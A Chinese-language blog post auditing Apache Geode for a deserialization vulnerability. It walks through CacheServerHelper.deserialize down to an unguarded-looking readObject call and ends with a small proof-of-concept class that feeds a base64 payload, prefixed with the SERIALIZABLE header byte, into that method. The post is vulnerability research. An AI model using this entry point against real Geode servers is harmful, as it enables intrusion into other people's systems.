---
title: Apache Geode审计现场实战 - 漏洞链构造/实时更新
published: true
---


这段时间笔者准备重新审计在此之前遇到的一个 Apache 中间件 Apache Geode，并且会在这里实时开源自己新鲜审计出来的利用链，供读者学习  

如果有人利用笔者的思路/利用链比我先审出来RCE也没关系(反正咱也不缺这一个)，这篇文章提到的利用链都是完全开放的，把洞卖了能分点钱给我就行(bushi)    

如果没审出来 RCE 也没关系，至少能学习到最优秀的程序员 coding 风格、审计思路和得到一堆本地命令执行漏洞  

| 利用链跳转 |
|--------|
| [利用链 1: CacheServerHelper.deserialize(Args)](#利用链-1) |
| [利用链 2: ](#利用链-2) |


# [](#header-31)Apache Geode介绍

Apache Geode 是一个基于 JVM 的 NoSQL 分布式数据处理平台，提供实时的、一致的、贯穿整个云架构地访问数据关键型应用，他的特点是强一致性和高实时性、对数据结构有更强的表达能力，能描述部分逻辑表达的内存数据库  

Apache Geode 的官方网站：[https://geode.apache.org/](https://geode.apache.org/)  
Apache Geode 的官方仓库：[https://github.com/apache/geode](https://github.com/apache/geode)  


# [](#header-31)利用链 1:
# [](#header-31)CacheServerHelper.deserialize(Args)

笔者注意到 org.apache.geode.internal.cache.tier.sockets.CacheServerHelper 被该中间件广泛使用在 client 和 server 的 Cache 交互中的处理文件或对象反序列化场景，而该对象关键三个方法如下所示  

```java

public class CacheServerHelper {
    public static Object deserialize(byte[] blob) throws IOException, ClassNotFoundException {
        return deserialize(blob, false);
    }

    public static Object deserialize(byte[] blob, boolean unzipObject) throws IOException, ClassNotFoundException {
        return unzipObject ? unzip(blob) : BlobHelper.deserializeBlob(blob);
    }

    public static Object deserialize(byte[] blob, KnownVersion version, boolean unzipObject) throws IOException, ClassNotFoundException {
        return unzipObject ? unzip(blob) : BlobHelper.deserializeBlob(blob, version, (ByteArrayDataInput)null);
    }
}

```

这几个重载都将数据引到 unzip 和 BlobHelper.deserializeBlob 中，虽然 unzip 在解压后直接能够触发反序列化，但该方法在源代码中不会被调用. 因此这里笔者直接跟进 BlobHelper.deserializeBlob 即 org.apache.geode.internal.util.BlobHelper.basicReadObject  

中间调用路径只是在将数据类型转化来转化去，因此笔者认为有省略的必要  

中间调用路径省略，而后经过逐层调用后直接来到了 org.apache.geode.internal.InternalDataSerializer.basicReadObject，此时由用户输入而来的参数 in 的类型为 PdxInputStream 既继承了 InputStream 又实现了 DataInput

```java
public class PdxInputStream extends ImmutableByteBufferInputStream
```

继续跟进 basicReadObject，其方法流程分析:  
1. 该方法首先先调用 DscodeHelper.toDSCODE 获取 header 判断文件类型后，根据类型进行解析操作. 在此直接取出 DSCODE 枚举类然后观察变量映射即可，笔者不赘述. 观察得知 44 为 SERIALIZABLE  

2. 继续如下 switch case 流程，笔者发现当 header 等于 SERIALIZABLE 时，能直接进入 readSerializable 然后调用 readObject  

basicReadObject 关键代码解析如下所示

```java

public abstract class InternalDataSerializer extends DataSerializer {

    public static Object basicReadObject(DataInput in) throws IOException, ClassNotFoundException {
        checkIn(in);
        byte header = in.readByte(); //获取 header
        DSCODE headerDSCode = DscodeHelper.toDSCODE(header); //获取 header 映射值 
        ...[日志省略]...

        if (headerDSCode == null) {
            ...[错误处理，忽略]...
        } else {
            switch (headerDSCode) {

                ...[省略几十个cases]...

                case SERIALIZABLE:
                    return readSerializable(in); //继续跟进，调用 InputStream.readObject

                ...[省略几十个cases]...

                default:
                    ...[错误处理，忽略]...
            }
        }
    }
}
```

继续跟进 readSerializable，发现如果继承 InputStream 了就直接强转，没有继承 InputStream 就写个 InputStream 的继承然后写个闭包的 read 方法 override，如下所示  

```java
public abstract class InternalDataSerializer extends DataSerializer {

    private static Serializable readSerializable(final DataInput in) throws IOException, ClassNotFoundException {
        ...[日志省略]...
        Serializable serializableResult;
        //这里是 PdxInputStream 因此不进入
        if (in instanceof DSObjectInputStream) {
            ...[不会进入该判断]...
        } else {
            InputStream stream;
            if (in instanceof InputStream) {
                stream = (InputStream)in;
            } else {
                //继承 override
                stream = new InputStream() {
                    public int read() throws IOException {
                        try {
                            return in.readUnsignedByte();
                        } catch (EOFException var2) {
                            return -1;
                        }
                    }
                };
            }
            //强转为 DSObjectInputStream
            ObjectInput ois = new DSObjectInputStream(stream);
            serializationFilter.setFilterOn((ObjectInputStream)ois);
            //这里虽然 DSObjectInputStream 是其子类，但无其他判断故省略  
            if (stream instanceof VersionedDataStream) {
                ...[日志省略]...
            }
            //成功 readObject 反序列化
            serializableResult = (Serializable)((ObjectInput)ois).readObject();
            ...[下面的代码省略]..
        }
        ...[下面的代码省略]..
    }

}

```
接下来构造 Payload  
Payload 就很简单了，构造流程只需要将 ObjectInputStream.writeObject 后的数据前置 44 即可，因此构造流程不在此演示  

```java
//Payload
package org.example;

import java.io.IOException;
import java.util.Base64;
import org.apache.geode.internal.cache.tier.sockets.CacheServerHelper;

public class Payload1 {
    public Payload1() throws IOException, ClassNotFoundException {
        byte[] payload = Base64.getDecoder().decode("LKztAAVzcgARb3JnLmV4YW1wbGUuSEFDSzLLqHONw213agIAAHhw");
        CacheServerHelper.deserialize(payload);
    }
}


```

# [](#header-31)利用链 2:

由于今天太晚了，明天再更新
